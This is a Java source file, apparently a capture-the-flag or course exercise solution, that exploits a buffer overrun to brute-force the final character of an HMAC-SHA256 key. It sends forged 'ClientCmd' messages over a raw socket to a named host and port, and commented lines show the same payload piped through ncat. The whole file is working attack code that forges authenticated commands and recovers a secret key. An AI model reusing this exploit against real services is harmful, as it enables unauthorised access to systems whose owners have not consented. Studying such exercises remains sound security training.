import javax.crypto.Mac;
import javax.crypto.spec.SecretKeySpec;
import javax.xml.bind.DatatypeConverter;
import java.io.BufferedReader;
import java.io.IOException;
import java.io.InputStreamReader;
import java.io.PrintWriter;
import java.net.Socket;
import java.security.InvalidKeyException;
import java.security.NoSuchAlgorithmException;

public class BufferOverRun_FindKey {

    public static void main(String[] args) {

        String alphabets = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789[ !#$£%&'()*+,-./\\:;<=>?@^_`{|}~\"ÄäÅåÖö¤]";
        //String digits = "0123456789";
        //String symbols = "[ !\"#$%&'()*+,-./:;<=>?@^_`{|}~]";
        try {
            String oneCharShortKey ="1234567891234567891";
            //String oneCharShortKey = "12345678912345678912";
            //String message = "ClientCmd|202233|aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa12345678912345678912";
            for (char c : alphabets.toCharArray()) {

                String hMackey = "1234567891234567891"+c;
                //System.out.println("KEY:" + oneCharShortKey);
                String command = "aaa............................";
                //System.out.println("command:" + command);
                String message = "ClientCmd|202233|" + command + hMackey;
                //System.out.println("Msg:" + message);
                //ClientCmd|202233|aaa ...........................This is a dummy oneCharShortKey!
                Mac hasher = Mac.getInstance("HmacSHA256");
                hasher.init(new SecretKeySpec(hMackey.getBytes(), "HmacSHA256"));

                byte[] hash = hasher.doFinal(message.getBytes());
                //System.out.println("HASH:"+hash);
                // to lowercase hexits
                String hexBin = DatatypeConverter.printHexBinary(hash);
                //System.out.println("hexBinary :" + hexBin.toLowerCase());
                // to base64

                //String base64Binary = DatatypeConverter.printBase64Binary(hash);
                //System.out.println("base64Binary: " + base64Binary + "\n");
                //System.out.print("Key :: " + oneCharShortKey + " :: ");
                //System.out.println("echo \"202233;" + command+";" + hexBin.toLowerCase() + "\" | ncat device1.vikaa.fi 35291\n");
                //System.out.println("echo \"202233;" + command + oneCharShortKey + ";" + hexBin.toLowerCase() + "\" | ncat device1.vikaa.fi 35291");
                telnetCode(command, oneCharShortKey, hexBin.toLowerCase());
            }
        } catch (NoSuchAlgorithmException e) {
            System.out.println("NoSuchAlgorithmException" + e.getMessage());
        } catch (InvalidKeyException e) {
            System.out.println("InvalidKeyException" + e.getMessage());
        }
    }


    public static void telnetCode(String cmd, String oneCharShortKey, String hexBin) {
        Socket pingSocket = null;
        PrintWriter out = null;
        BufferedReader in = null;

        try {
            pingSocket = new Socket("device1.vikaa.fi", 35291);
            out = new PrintWriter(pingSocket.getOutputStream(), true);
            in = new BufferedReader(new InputStreamReader(pingSocket.getInputStream()));
        } catch (IOException e) {
            return;
        }
        //System.out.println("echo \"202233;" + cmd + oneCharShortKey + ";" + hexBin.toLowerCase() + "\" | ncat device1.vikaa.fi 35291");
        out.println("202233;" + cmd + oneCharShortKey + ";" + hexBin.toLowerCase());

        //out.println("202233;aaa............................12345678912345678912;331f5fb7709a6cc09ee2474a2f068f270bbd9507fb3d4074ad77a6e96714277e");
        //System.out.println("202233;" + cmd + oneCharShortKey + ";" + hexBin.toLowerCase());
        try {
                String readLines = in.readLine();
            if (!readLines.equals("Invalid HMAC. Command not accepted.")) {
                System.out.println(readLines);
                System.out.println(" -----Matched:" + oneCharShortKey);
            } else{
                System.out.println(readLines);
            }
            out.close();
            in.close();
            pingSocket.close();
        } catch (IOException e) {
            e.printStackTrace();
        }

    }
}
